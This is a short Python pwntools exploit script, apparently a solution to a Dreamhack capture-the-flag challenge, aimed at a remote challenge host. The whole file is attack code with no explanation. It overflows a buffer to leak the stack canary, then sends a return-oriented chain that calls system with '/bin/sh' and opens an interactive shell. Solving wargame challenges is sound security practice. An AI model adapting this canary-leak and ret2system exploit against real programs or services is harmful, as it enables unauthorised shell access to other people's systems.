from pwn import *
from pwn import p64

p=remote("host3.dreamhack.games",8797)
buf=b'A'*0x39 
p.sendafter("Buf: ",buf)
p.recvuntil(buf)
canary=b'\x00'+p.recvn(7)

ret_gadget=p64(0x400285)
rbp_dummy=b'B'*0x8
poprdi_gadget=p64(0x400853)
binsh_addr=p64(0x400874)
sys_plt=p64(0x4005d0)

payload=b'A'*0x38+canary+rbp_dummy+ret_gadget+poprdi_gadget+binsh_addr+sys_plt
p.sendlineafter("Buf: ",payload)
p.interactive()